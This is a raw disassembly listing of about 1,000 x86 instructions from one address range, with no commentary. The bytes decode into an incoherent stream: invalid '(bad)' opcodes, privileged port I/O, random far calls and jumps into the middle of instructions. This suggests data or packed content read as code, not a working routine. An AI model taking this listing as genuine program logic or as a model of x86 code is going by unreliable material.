  43aff3:	push   edx
  43aff4:	imul   edx,edi,0x4de69aba
  43affa:	outs   dx,BYTE PTR ds:[esi]
  43affb:	push   ebp
  43affc:	adc    BYTE PTR [edi+0x78],0x4
  43b000:	mov    bl,0xd
  43b002:	ficom  DWORD PTR [edx]
  43b004:	dec    esi
  43b005:	lods   eax,DWORD PTR ds:[esi]
  43b006:	mov    ah,0x6b
  43b008:	jmp    0xbd6a4a72
  43b00d:	add    eax,0xa3ab0e55
  43b012:	imul   BYTE PTR [ecx-0x53fb33d6]
  43b018:	bnd jbe 0x43afd5
  43b01b:	repz cmc 
  43b01d:	lds    esp,FWORD PTR [edx]
  43b01f:	jnp    0x43afd3
  43b021:	sub    eax,0x9e04edb1
  43b026:	add    bh,cl
  43b028:	or     ecx,DWORD PTR [edi]
  43b02a:	adc    al,0xa3
  43b02c:	ret    
  43b02d:	jb     0x43b0a3
  43b02f:	sbb    eax,0x2d7c2272
  43b034:	lods   eax,DWORD PTR ds:[esi]
  43b035:	pop    ss
  43b036:	lahf   
  43b037:	repnz mov ah,0xcb
  43b03a:	shl    BYTE PTR [ebp*1-0x4d986961],cl
  43b041:	inc    ecx
  43b042:	ds mov ecx,0x9f14930d
  43b048:	mov    BYTE PTR [eax+esi*8],0xd1
  43b04c:	sti    
  43b04d:	lds    ebx,FWORD PTR [edx-0x1ad46bd0]
  43b053:	dec    ebx
  43b054:	mov    ch,0x39
  43b056:	ins    DWORD PTR es:[edi],dx
  43b057:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b058:	pop    edx
  43b059:	js     0x43b0d4
  43b05b:	popf   
  43b05c:	cmp    al,0x93
  43b05e:	mov    dl,0x22
  43b060:	push   0x6d675116
  43b065:	or     ecx,DWORD PTR [ebp+0x5e]
  43b068:	pop    ebx
  43b069:	mov    dh,0x85
  43b06b:	leave  
  43b06c:	mov    cl,0xea
  43b06e:	addr16 iret 
  43b070:	mov    al,ds:0x39377996
  43b075:	ins    DWORD PTR es:[edi],dx
  43b076:	and    al,0xa7
  43b078:	retf   
  43b079:	jmp    0xd9274fb0
  43b07e:	jb     0x43b0ea
  43b080:	mov    dl,0xcc
  43b082:	xchg   edi,eax
  43b083:	dec    ebp
  43b084:	setne  BYTE PTR [eax+0x13]
  43b088:	inc    esp
  43b089:	adc    eax,0x4bdb5716
  43b08e:	or     ah,ch
  43b090:	not    edx
  43b092:	cmp    DWORD PTR [esi-0x4e],edx
  43b095:	push   0x26
  43b097:	jmp    0x43b0a1
  43b099:	sbb    eax,0xb316900
  43b09e:	mov    bh,0x43
  43b0a0:	addr16 inc eax
  43b0a2:	gs push ss
  43b0a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b0a5:	adc    DWORD PTR [edx+0x14bddadf],ebx
  43b0ab:	mov    es:0xfba755d0,al
  43b0b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b0b2:	cmp    eax,0x3f5c8f4e
  43b0b7:	xor    bh,ch
  43b0b9:	xchg   ecx,eax
  43b0ba:	retw   
  43b0bc:	mov    esp,0x12e9dd18
  43b0c1:	test   DWORD PTR [edx-0x80],ebp
  43b0c4:	xor    eax,0x513e9a55
  43b0c9:	sbb    DWORD PTR [eax-0x30cdcb7e],0x37
  43b0d0:	add    al,0xe
  43b0d2:	sahf   
  43b0d3:	mov    dh,0x77
  43b0d5:	jmp    FWORD PTR [edi-0x59]
  43b0d8:	pop    es
  43b0d9:	lods   eax,DWORD PTR ds:[esi]
  43b0da:	push   eax
  43b0db:	xor    dh,BYTE PTR [ecx-0x48e1fd74]
  43b0e1:	jnp    0x43b09f
  43b0e3:	pop    esi
  43b0e4:	cmp    DWORD PTR [esi-0x2c6a61a6],esp
  43b0ea:	ret    0x9da7
  43b0ed:	xchg   edx,eax
  43b0ee:	cmp    DWORD PTR [eax-0xa],esp
  43b0f1:	mov    edi,0x98c20b8a
  43b0f6:	call   0x5b97:0x6651335
  43b0fd:	repnz mov edx,0x3f33f8b9
  43b103:	addr16 push ecx
  43b105:	clc    
  43b106:	leave  
  43b107:	inc    eax
  43b108:	or     DWORD PTR [edi],0xffffff9a
  43b10b:	xlat   BYTE PTR ds:[ebx]
  43b10c:	push   edx
  43b10d:	xchg   edi,eax
  43b10e:	pop    edi
  43b10f:	mov    esi,?
  43b111:	rcl    BYTE PTR [ecx+ebp*4-0x33],cl
  43b115:	jae    0x43b129
  43b117:	mov    bl,0x52
  43b119:	mov    bh,0x2e
  43b11b:	add    eax,0xdd9ad3f9
  43b120:	or     eax,0x9d8b7666
  43b125:	adc    esp,esi
  43b127:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b128:	xchg   DWORD PTR [ecx+ebp*8],edi
  43b12b:	inc    eax
  43b12c:	mov    eax,0xb271e8d1
  43b131:	and    esi,DWORD PTR ds:0xfa474c70
  43b137:	or     DWORD PTR cs:[ebx],0x28d5df9e
  43b13e:	rcr    bl,0xbd
  43b141:	sbb    al,0x9a
  43b143:	dec    ebp
  43b144:	mov    ecx,0x51f6b456
  43b149:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b14a:	frstor [edi+0x1043fc3f]
  43b150:	cmp    eax,0xb2e66ba4
  43b155:	outs   dx,BYTE PTR ds:[esi]
  43b156:	sbb    al,0xa5
  43b158:	add    ch,BYTE PTR [edi]
  43b15a:	jle    0x43b0e8
  43b15c:	and    ebp,DWORD PTR [ebx-0x5]
  43b15f:	shr    DWORD PTR [esi+eiz*4],0xd3
  43b163:	mov    ebx,0x6c191aae
  43b168:	xor    dh,BYTE PTR [ecx+0x63]
  43b16b:	pop    es
  43b16c:	or     DWORD PTR [edx],ebp
  43b16e:	or     BYTE PTR [ebp-0x666fb67],bl
  43b174:	pop    ebx
  43b175:	adc    cl,cl
  43b177:	push   esi
  43b178:	xor    bh,dh
  43b17a:	xor    eax,0x7769b26e
  43b17f:	mov    dh,0x1
  43b181:	cmp    dl,BYTE PTR [edx+0x3204f251]
  43b187:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b188:	pop    ebx
  43b189:	mov    ds,WORD PTR [edx+0xf5ec8ac]
  43b18f:	mov    dl,ch
  43b191:	xchg   esi,eax
  43b192:	sahf   
  43b193:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b194:	cmp    BYTE PTR [edi+0xff907da],ah
  43b19a:	dec    ecx
  43b19b:	test   al,0xc5
  43b19d:	adc    DWORD PTR [ecx+0x9],0xffffffd2
  43b1a1:	adc    eax,0xc48b4e04
  43b1a6:	test   DWORD PTR [esp+ecx*4],ecx
  43b1a9:	pop    edi
  43b1aa:	call   0xe4bf:0xa8cc58b7
  43b1b1:	sti    
  43b1b2:	or     ah,BYTE PTR [edi+0x1b1fe334]
  43b1b8:	and    al,0xf
  43b1ba:	inc    esp
  43b1bb:	cmp    ah,BYTE PTR [ecx+0x4965d81b]
  43b1c1:	or     ah,BYTE PTR [ebx+0x61]
  43b1c4:	or     eax,DWORD PTR [esi-0x25]
  43b1c7:	(bad)  
  43b1c8:	in     eax,0x17
  43b1ca:	call   0x4352:0xdca8dbc0
  43b1d1:	loop   0x43b205
  43b1d3:	mov    al,ds:0x86d95cf9
  43b1d8:	retf   0xbaa4
  43b1db:	pop    edx
  43b1dc:	sub    bh,cl
  43b1de:	dec    esi
  43b1df:	mov    WORD PTR [esi+eiz*4-0x280d0e9c],gs
  43b1e6:	in     al,dx
  43b1e7:	and    cl,BYTE PTR [edx]
  43b1e9:	popa   
  43b1ea:	jnp    0x43b193
  43b1ec:	adc    edi,ecx
  43b1ee:	or     eax,0x3e21f06e
  43b1f3:	pop    esp
  43b1f4:	mov    dl,0x25
  43b1f6:	pusha  
  43b1f7:	test   ecx,eax
  43b1f9:	fldln2 
  43b1fb:	push   ss
  43b1fc:	push   ebx
  43b1fd:	js     0x43b24f
  43b1ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b200:	mov    edx,0xa6ff1f98
  43b205:	bound  eax,QWORD PTR [ecx]
  43b207:	dec    edx
  43b208:	mov    dl,0x73
  43b20a:	jmp    0x27fd:0xd96ac8a0
  43b211:	or     esi,DWORD PTR [ecx]
  43b213:	mov    WORD PTR [eax+eax*2+0x67a08abb],es
  43b21a:	mov    ds:0x5e0bf28f,eax
  43b21f:	mov    ecx,0x2a8fd57a
  43b224:	mov    ebp,0x11c4530b
  43b229:	xchg   eax,esi
  43b22b:	out    0xd0,al
  43b22d:	hlt    
  43b22e:	mov    al,ds:0x4d05687c
  43b233:	(bad)  
  43b234:	je     0x43b2a1
  43b236:	mov    dl,0x1f
  43b238:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b239:	mov    edi,0xb26514b
  43b23e:	aaa    
  43b23f:	stos   BYTE PTR es:[edi],al
  43b240:	and    DWORD PTR [ebx-0xcadedce],ebx
  43b246:	call   0xe540:0xd8811801
  43b24d:	stos   BYTE PTR es:[edi],al
  43b24e:	test   DWORD PTR [edi+0x781403bc],esp
  43b254:	leave  
  43b255:	xor    bl,ah
  43b257:	ins    DWORD PTR es:[edi],dx
  43b258:	scas   eax,DWORD PTR es:[edi]
  43b259:	ficom  DWORD PTR [edx]
  43b25b:	push   esi
  43b25c:	xor    dh,BYTE PTR [ebx-0x57]
  43b25f:	xchg   ebp,eax
  43b260:	fwait
  43b261:	popf   
  43b262:	iret   
  43b263:	fldenv [ebx]
  43b265:	(bad)  
  43b266:	punpcklbw mm6,DWORD PTR [eax-0x44]
  43b26a:	repz addr16 jae 0x43b265
  43b26e:	push   esi
  43b26f:	loope  0x43b223
  43b271:	ret    0xb390
  43b274:	pop    edx
  43b275:	mov    cl,0xc2
  43b277:	out    dx,eax
  43b278:	inc    ecx
  43b279:	or     al,0x87
  43b27b:	xor    DWORD PTR [edi-0x3dd84540],ebx
  43b281:	das    
  43b282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b283:	jmp    0x43b237
  43b285:	mov    eax,0xcbb7352a
  43b28a:	and    al,0x97
  43b28c:	sbb    BYTE PTR [ebx],cl
  43b28e:	mov    ecx,0x6258790f
  43b293:	cs fwait
  43b295:	ret    0xd986
  43b298:	mov    al,ds:0x5a355a85
  43b29d:	cs inc ecx
  43b29f:	mov    ah,0x4c
  43b2a1:	or     esi,eax
  43b2a3:	jmp    0x43b22f
  43b2a5:	mov    ah,0x8a
  43b2a7:	xchg   ecx,eax
  43b2a8:	dec    esi
  43b2a9:	mov    DWORD PTR [edx+0x3ee6ea1a],ebx
  43b2af:	sbb    DWORD PTR [edx+0x2ba73c8f],0x7be78279
  43b2b9:	les    esp,FWORD PTR [edx]
  43b2bb:	dec    esp
  43b2bc:	mov    dl,0x4d
  43b2be:	stos   BYTE PTR es:[edi],al
  43b2bf:	xchg   esi,eax
  43b2c0:	jo     0x43b321
  43b2c2:	ror    BYTE PTR [ecx-0x6],0xb
  43b2c6:	xchg   BYTE PTR [edx-0x4a9553ba],bl
  43b2cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b2cd:	mov    ebp,0x7f278a9d
  43b2d2:	jo     0x43b2b6
  43b2d4:	repnz adc BYTE PTR [edi-0x79f47bd6],0xb
  43b2dc:	dec    esi
  43b2dd:	adc    BYTE PTR [ecx+ebx*4],al
  43b2e0:	jo     0x43b2e5
  43b2e2:	sahf   
  43b2e3:	and    BYTE PTR [edx],ah
  43b2e5:	or     al,0xa5
  43b2e7:	inc    esp
  43b2e8:	xor    ah,BYTE PTR [ecx]
  43b2ea:	(bad)  
  43b2eb:	sbb    esp,DWORD PTR [edx+0xb]
  43b2ee:	loop   0x43b34d
  43b2f0:	lahf   
  43b2f1:	xchg   DWORD PTR [esi-0x65c0b408],esi
  43b2f7:	jmp    0x8b04:0xe8d8ee98
  43b2fe:	jge    0x43b2b0
  43b300:	mov    eax,ds:0xd0a7bca6
  43b305:	adc    dl,BYTE PTR [edi-0x7]
  43b308:	out    0x3c,eax
  43b30a:	call   0xf54a:0x968035f7
  43b311:	push   0xffffffa9
  43b313:	mov    ecx,0x671cee62
  43b318:	call   0x9ae3:0xe1333163
  43b31f:	mov    BYTE PTR [ebp-0x5514f6d9],ah
  43b325:	aaa    
  43b326:	add    ah,BYTE PTR [edi-0x5cae3c97]
  43b32c:	(bad)  
  43b32d:	test   BYTE PTR [ebp-0x1c],0xb3
  43b331:	bound  esp,QWORD PTR [ebp-0x30]
  43b334:	xchg   ecx,eax
  43b335:	xchg   esi,eax
  43b336:	std    
  43b337:	xor    bl,BYTE PTR [esi-0x19]
  43b33a:	mov    esi,0xeb0ba943
  43b33f:	sub    DWORD PTR [esi+edi*1-0x254b076e],ebp
  43b346:	mov    al,ds:0x82048299
  43b34b:	out    dx,al
  43b34c:	pop    ecx
  43b34d:	dec    ebx
  43b34e:	shr    BYTE PTR [eax],cl
  43b350:	mov    esi,0x97b9a1e9
  43b355:	mov    edx,0x7e92a001
  43b35a:	inc    ebp
  43b35b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b35c:	mov    ds:0xb7ddab64,eax
  43b361:	jb     0x43b313
  43b363:	add    eax,0x5b1ae6b0
  43b368:	jmp    0x1a47:0xf099fcbd
  43b36f:	in     eax,dx
  43b370:	sub    DWORD PTR [eax+esi*8-0x72d8c603],ebx
  43b377:	xor    ch,ch
  43b379:	adc    eax,0x39b58622
  43b37e:	or     DWORD PTR [esi],esp
  43b380:	ret    0xd1db
  43b383:	push   eax
  43b384:	js     0x43b32c
  43b386:	mov    ds:0x6c8cbd84,al
  43b38b:	in     eax,0x88
  43b38d:	xor    dl,bh
  43b38f:	arpl   di,sp
  43b391:	cmp    ah,cl
  43b393:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b394:	jmp    0x43b3eb
  43b396:	xchg   DWORD PTR [edx+0x6ce10afc],esi
  43b39c:	sahf   
  43b39d:	or     al,0xad
  43b39f:	mov    gs,WORD PTR [edi-0x69581c93]
  43b3a5:	inc    esp
  43b3a6:	out    dx,al
  43b3a7:	std    
  43b3a8:	xor    BYTE PTR [edx+0x31],0xa7
  43b3ac:	rcl    bl,0x1d
  43b3af:	xor    ecx,DWORD PTR [ecx+0x65]
  43b3b2:	pop    esi
  43b3b3:	jl     0x43b366
  43b3b5:	pop    esp
  43b3b6:	xor    al,0xa0
  43b3b8:	mov    ds:0x7b076741,al
  43b3bd:	push   ss
  43b3be:	add    DWORD PTR [ebx-0x7c],ebx
  43b3c1:	add    eax,0x7608c4b1
  43b3c6:	cs push 0x737b89b2
  43b3cc:	inc    ecx
  43b3cd:	aad    0x5e
  43b3cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b3d0:	mov    dl,0xf1
  43b3d2:	repz shr DWORD PTR ss:[ebp+0xb112f2b],1
  43b3da:	mov    ah,0x7a
  43b3dc:	sbb    eax,0x990b879
  43b3e1:	neg    DWORD PTR [edx+0x6001a324]
  43b3e7:	mov    ds:0xa7dcef7d,al
  43b3ec:	ret    0x1b11
  43b3ef:	fisttp DWORD PTR [ecx-0x4d02aca3]
  43b3f5:	in     eax,dx
  43b3f6:	inc    ecx
  43b3f7:	xchg   esp,eax
  43b3f8:	dec    eax
  43b3f9:	xor    eax,0xbece7b5
  43b3fe:	das    
  43b3ff:	cmp    dl,BYTE PTR [edi+edi*8-0xb32007e]
  43b406:	cdq    
  43b407:	ror    BYTE PTR [ecx-0x7119a15d],0xb3
  43b40e:	loop   0x43b3fe
  43b410:	repnz push ss
  43b412:	test   BYTE PTR [edx+eax*4+0x4b],dh
  43b416:	icebp  
  43b417:	pop    ds
  43b418:	push   edx
  43b419:	popf   
  43b41a:	jae    0x43b451
  43b41c:	mov    esp,ebx
  43b41e:	daa    
  43b41f:	mov    ch,0x92
  43b421:	gs call 0x4e00:0xf250834e
  43b429:	xor    BYTE PTR [eax],dh
  43b42b:	repz (bad)
  43b42e:	call   0x7525:0x5a46d46c
  43b435:	adc    esp,edx
  43b437:	rcr    DWORD PTR [esi],1
  43b439:	leave  
  43b43a:	cwde   
  43b43b:	push   ds
  43b43c:	add    ebp,esi
  43b43e:	inc    edi
  43b43f:	or     al,0x52
  43b441:	scas   al,BYTE PTR es:[edi]
  43b442:	in     eax,0xbc
  43b444:	mov    dl,0x34
  43b446:	sub    eax,0x8ce0e2e3
  43b44b:	xchg   ebx,eax
  43b44c:	jmp    0x43b459
  43b44e:	cwde   
  43b44f:	inc    esp
  43b450:	cdq    
  43b451:	sbb    bh,BYTE PTR [edi+0x1a]
  43b454:	push   ss
  43b455:	call   0xc769:0x6414
  43b45b:	xor    WORD PTR [edx-0x23],0xe3a7
  43b461:	scas   al,BYTE PTR es:[edi]
  43b462:	mov    bl,0xdd
  43b464:	adc    eax,0x8c1c5878
  43b469:	add    esi,DWORD PTR [esi-0x59]
  43b46c:	dec    esi
  43b46d:	adc    ebx,ebp
  43b46f:	call   0x8be30ee5
  43b474:	dec    edx
  43b475:	in     eax,dx
  43b476:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  43b478:	dec    eax
  43b479:	aaa    
  43b47a:	inc    ebx
  43b47b:	rol    DWORD PTR [ebx+0x7a3b9a3f],0xe9
  43b482:	inc    ebp
  43b483:	sub    DWORD PTR [esi-0x1e],edx
  43b486:	xor    DWORD PTR [edi+0x3d8eec9e],esp
  43b48c:	retf   
  43b48d:	sbb    al,0x6e
  43b48f:	xchg   ebx,eax
  43b490:	shl    BYTE PTR [edi-0x7c],0x5c
  43b494:	or     eax,0x7231dab9
  43b499:	pop    ecx
  43b49a:	cmp    esp,DWORD PTR [ebp-0x14]
  43b49d:	sbb    edx,esi
  43b49f:	cmovp  ecx,ebx
  43b4a2:	div    DWORD PTR [ecx-0x3d62bf36]
  43b4a8:	jnp    0x43b4cf
  43b4aa:	push   cs
  43b4ab:	xchg   ebp,eax
  43b4ac:	bound  ebp,QWORD PTR [ebp+0x17a77c5d]
  43b4b2:	loope  0x43b50d
  43b4b4:	pusha  
  43b4b5:	retf   0x913a
  43b4b8:	and    BYTE PTR [edx+esi*8],dl
  43b4bb:	xlat   BYTE PTR ds:[ebx]
  43b4bc:	jmp    0x43b49d
  43b4be:	mov    BYTE PTR [ebx],dl
  43b4c0:	mov    gs,WORD PTR [esi]
  43b4c2:	call   0x9ef5:0x5eda7396
  43b4c9:	or     eax,DWORD PTR [ecx-0x2797ab1f]
  43b4cf:	(bad)  
  43b4d0:	mov    ah,0x84
  43b4d2:	xchg   ebp,eax
  43b4d3:	push   eax
  43b4d4:	dec    eax
  43b4d5:	loope  0x43b4ca
  43b4d7:	sub    BYTE PTR [ebx],ch
  43b4d9:	sbb    BYTE PTR [edx-0x1f92da7e],bl
  43b4df:	bound  eax,QWORD PTR [ebx-0x1929b3f5]
  43b4e5:	xchg   ebx,eax
  43b4e6:	cmp    BYTE PTR [ecx-0x4b],0xaf
  43b4ea:	call   0x4dc9:0x14941757
  43b4f1:	or     eax,0x5eafa70a
  43b4f6:	cli    
  43b4f7:	and    DWORD PTR ds:0xb228d462,edx
  43b4fd:	jmp    0xe06f:0x701d0375
  43b504:	mov    cl,0xb
  43b506:	test   BYTE PTR [ebx+0x4f],al
  43b509:	cmp    edx,DWORD PTR [edi+edi*1-0x3c112e6a]
  43b510:	mov    dl,0x8f
  43b512:	sbb    bl,dl
  43b514:	and    BYTE PTR [esi],bh
  43b516:	jo     0x43b545
  43b518:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b519:	mov    bl,0x80
  43b51b:	cwde   
  43b51c:	xor    esp,DWORD PTR [esi+0x61f1b49a]
  43b522:	or     eax,0x9ad269ee
  43b527:	pop    edi
  43b528:	or     esi,edx
  43b52a:	sahf   
  43b52b:	xor    al,0x14
  43b52d:	jle    0x43b4e1
  43b52f:	xlat   BYTE PTR ds:[ebx]
  43b530:	add    ch,BYTE PTR ds:0xbdd1d2c
  43b536:	or     ch,ch
  43b538:	jle    0x43b526
  43b53a:	pop    eax
  43b53b:	xchg   edx,eax
  43b53c:	mov    dl,0x16
  43b53e:	cmp    DWORD PTR ds:0x2147862b,esp
  43b544:	not    DWORD PTR [edi]
  43b546:	or     dh,0x6e
  43b549:	mov    edx,DWORD PTR [ecx]
  43b54b:	or     DWORD PTR [ecx],0xb286272e
  43b551:	dec    eax
  43b552:	cmp    al,0x77
  43b554:	rcr    BYTE PTR [ebx+ecx*8-0x338909ac],cl
  43b55b:	mov    eax,0x74d48b3f
  43b560:	jmp    0x626bc770
  43b565:	stos   DWORD PTR es:[edi],eax
  43b566:	mov    ecx,0x8f55b5c7
  43b56b:	push   eax
  43b56c:	xchg   esp,eax
  43b56d:	adc    eax,0x5401a023
  43b572:	sub    DWORD PTR [ebp-0x71022c9c],ebp
  43b578:	jmp    0x43b581
  43b57a:	sbb    ebx,DWORD PTR [edi-0x70]
  43b57d:	push   esi
  43b57e:	pop    edx
  43b57f:	or     DWORD PTR [ecx+0x44ae1fd4],esi
  43b585:	mov    ch,0xa5
  43b587:	pop    ds
  43b588:	inc    esi
  43b589:	jmp    0x43b52f
  43b58b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b58c:	ss inc eax
  43b58e:	push   ebp
  43b58f:	cs das 
  43b591:	jmp    0xb8bf:0xbabd3d26
  43b598:	hlt    
  43b599:	dec    ebx
  43b59a:	inc    ebx
  43b59b:	cli    
  43b59c:	sbb    cl,BYTE PTR [esi+0x37]
  43b59f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b5a0:	cld    
  43b5a1:	push   ebp
  43b5a2:	mov    cl,0x27
  43b5a4:	mov    ah,0x5f
  43b5a6:	inc    esi
  43b5a7:	jo     0x43b55b
  43b5a9:	shl    ch,0xf1
  43b5ac:	push   esp
  43b5ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b5ae:	pop    ds
  43b5af:	adc    BYTE PTR [ecx],ah
  43b5b1:	or     al,0xdf
  43b5b3:	inc    esi
  43b5b4:	int    0xd5
  43b5b6:	pop    edi
  43b5b7:	xlat   BYTE PTR ds:[ebx]
  43b5b8:	fs pop eax
  43b5ba:	xor    BYTE PTR [edx+esi*4+0x11],ch
  43b5be:	xchg   edi,eax
  43b5bf:	cli    
  43b5c0:	les    edx,FWORD PTR [edx]
  43b5c2:	jmp    edi
  43b5c4:	icebp  
  43b5c5:	or     edx,DWORD PTR [edi+0x19]
  43b5c8:	daa    
  43b5c9:	test   BYTE PTR [ebp+0x733d20e0],dh
  43b5cf:	dec    edx
  43b5d0:	push   ds
  43b5d1:	div    DWORD PTR ds:0xd80cb247
  43b5d7:	scas   al,BYTE PTR es:[edi]
  43b5d8:	sub    BYTE PTR [edx+0x56],cl
  43b5db:	imul   ecx,DWORD PTR [ebx+0x204c750a],0x89d14b2f
  43b5e5:	repz dec eax
  43b5e7:	xor    al,0xb2
  43b5e9:	scas   eax,DWORD PTR es:[edi]
  43b5ea:	mov    ss,WORD PTR [ebp+0x4bc1c519]
  43b5f0:	xor    al,0xb
  43b5f2:	pop    ss
  43b5f3:	(bad)  
  43b5f4:	pop    ebx
  43b5f5:	push   0x1
  43b5f7:	jb     0x43b5bb
  43b5f9:	sub    DWORD PTR [edi-0x11741b5c],esp
  43b5ff:	or     dh,bh
  43b601:	mov    edx,0xc841cf5
  43b606:	(bad)  
  43b607:	jle    0x43b589
  43b609:	arpl   WORD PTR [edx+0x3a18dc7],ax
  43b60f:	xor    dh,BYTE PTR [edx+0x3d616ceb]
  43b615:	scas   al,BYTE PTR es:[edi]
  43b616:	jnp    0x43b60d
  43b618:	xor    ebp,DWORD PTR cs:[ebx]
  43b61b:	mov    dl,BYTE PTR [esi]
  43b61d:	inc    DWORD PTR [edx+0x43b9bc99]
  43b623:	clc    
  43b624:	rcl    DWORD PTR [ecx+ecx*1],cl
  43b627:	(bad)  
  43b628:	ret    0x20f0
  43b62b:	or     al,0xd2
  43b62d:	and    ch,BYTE PTR [ecx-0x26c24e0e]
  43b633:	xchg   edx,eax
  43b634:	push   cs
  43b635:	cmp    bh,BYTE PTR [eax]
  43b637:	pop    es
  43b638:	pop    edi
  43b639:	loop   0x43b5d3
  43b63b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b63c:	repz sub al,0x87
  43b63f:	(bad)
  43b644:	std    
  43b645:	icebp  
  43b646:	test   DWORD PTR [edx+edx*1-0x1050a50e],ebx
  43b64d:	dec    ebx
  43b64e:	jmp    0x6960ef06
  43b653:	inc    ebx
  43b654:	pop    esi
  43b655:	or     eax,DWORD PTR [eax*8-0x63de56fb]
  43b65c:	mov    dl,0x84
  43b65e:	push   cs
  43b65f:	fcmove st,st(6)
  43b661:	cs sti 
  43b663:	jge    0x43b682
  43b665:	or     edx,ebp
  43b667:	sahf   
  43b668:	xlat   BYTE PTR ds:[ebx]
  43b669:	scas   eax,DWORD PTR es:[edi]
  43b66a:	cmp    ebp,DWORD PTR [eax+0x69]
  43b66d:	mov    WORD PTR [edx+0x68e68252],ds
  43b673:	fistp  WORD PTR [ecx+0x67a78f9d]
  43b679:	lock or DWORD PTR [esi+ebx*1-0x4cdef16f],edi
  43b681:	xor    dh,BYTE PTR [ecx]
  43b683:	scas   eax,DWORD PTR es:[edi]
  43b684:	cmp    cl,BYTE PTR [esp+ebx*8-0x254795d8]
  43b68b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b68c:	mov    BYTE PTR [edx],bh
  43b68e:	ja     0x43b6c8
  43b690:	jo     0x43b671
  43b692:	scas   al,BYTE PTR es:[edi]
  43b693:	pop    ss
  43b694:	mov    dl,0x6c
  43b696:	mov    dh,0x62
  43b698:	pop    es
  43b699:	xor    eax,DWORD PTR [ecx]
  43b69b:	mov    bl,BYTE PTR [edx]
  43b69d:	xor    DWORD PTR [esi-0x6b],edi
  43b6a0:	mov    dl,0x13
  43b6a2:	jge    0x43b6f1
  43b6a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b6a5:	lea    edi,[edi]
  43b6a7:	mov    bl,0x9c
  43b6a9:	xchg   sp,ax
  43b6ab:	bound  esi,QWORD PTR [edx-0x5116f7df]
  43b6b1:	cld    
  43b6b2:	je     0x43b65c
  43b6b4:	mov    edx,0x7298b727
  43b6b9:	out    dx,eax
  43b6ba:	push   0xffffffc2
  43b6bc:	ja     0x43b6e9
  43b6be:	call   0xb7dd:0x575a126
  43b6c5:	gs adc al,0xa8
  43b6c8:	repz adc eax,DWORD PTR [edx]
  43b6cb:	lds    edx,FWORD PTR [edx]
  43b6cd:	ret    
  43b6ce:	add    BYTE PTR [edi+ebp*2+0x4e999ad2],ch
  43b6d5:	mov    ebp,ebp
  43b6d7:	test   eax,0xa7e9da12
  43b6dc:	inc    edx
  43b6dd:	cmp    eax,0x453651e3
  43b6e2:	cld    
  43b6e3:	xchg   ebp,eax
  43b6e4:	pop    eax
  43b6e5:	in     eax,dx
  43b6e6:	call   0x26c6:0xd7bfe50d
  43b6ed:	pop    edx
  43b6ee:	rcr    edi,0x81
  43b6f1:	or     ecx,DWORD PTR [eax+edi*8]
  43b6f4:	int    0x72
  43b6f6:	out    0xd6,eax
  43b6f8:	mov    dl,dh
  43b6fa:	call   0x83cf:0x6e9cf981
  43b701:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b702:	in     al,0xa8
  43b704:	cdq    
  43b705:	in     eax,0x19
  43b707:	jmp    0x43b6bb
  43b709:	mov    ebp,0x778bd1a7
  43b70e:	call   0xf1af:0xcdf33d4
  43b715:	push   es
  43b716:	add    ah,BYTE PTR [edi-0x6d187d44]
  43b71c:	jge    0x43b6e8
  43b71e:	ds pushf 
  43b720:	mov    dl,0x3a
  43b722:	push   cs
  43b723:	and    BYTE PTR [esi+0x7bcdc2f6],bh
  43b729:	or     esp,DWORD PTR [edi]
  43b72b:	pop    ebp
  43b72c:	or     DWORD PTR [ebx+0x71],esp
  43b72f:	cmp    ebx,ecx
  43b731:	mov    bl,0x2
  43b733:	xor    eax,0xfb6c91b3
  43b738:	aas    
  43b739:	cli    
  43b73a:	scas   al,BYTE PTR es:[edi]
  43b73b:	data16 jp 0x43b720
  43b73e:	test   BYTE PTR [esi+0x57e7e86b],ah
  43b744:	int    0xa2
  43b746:	mov    esp,0x9a9f17c7
  43b74b:	xchg   ecx,eax
  43b74c:	outs   dx,DWORD PTR ds:[esi]
  43b74d:	stc    
  43b74e:	or     al,0xb0
  43b750:	xchg   ecx,eax
  43b751:	jb     0x43b740
  43b753:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b754:	dec    esi
  43b755:	push   cs
  43b756:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b757:	cmp    edx,DWORD PTR [eax+0x64]
  43b75a:	sbb    edi,ebp
  43b75c:	mov    dl,0x30
  43b75e:	loope  0x43b6e3
  43b760:	adc    al,0x73
  43b762:	inc    ebp
  43b763:	mov    DWORD PTR [ebx+0x6a87a00c],esi
  43b769:	mov    bh,0xb6
  43b76b:	jo     0x43b716
  43b76d:	rcr    BYTE PTR [edx+0x4105d93f],0xf5
  43b774:	mov    dl,0x72
  43b776:	(bad)  
  43b777:	fistp  QWORD PTR [edi+ebp*1]
  43b77a:	rol    DWORD PTR ds:0x8c11362b,0x32
  43b781:	cmp    BYTE PTR [ecx+0x77],ah
  43b784:	out    dx,eax
  43b785:	sub    al,0x91
  43b787:	les    esi,FWORD PTR [edx+0x530b4bc3]
  43b78d:	ja     0x43b80c
  43b78f:	or     al,0xc1
  43b791:	or     DWORD PTR [eax+0x1d],eax
  43b794:	gs xor eax,0x3ef2e783
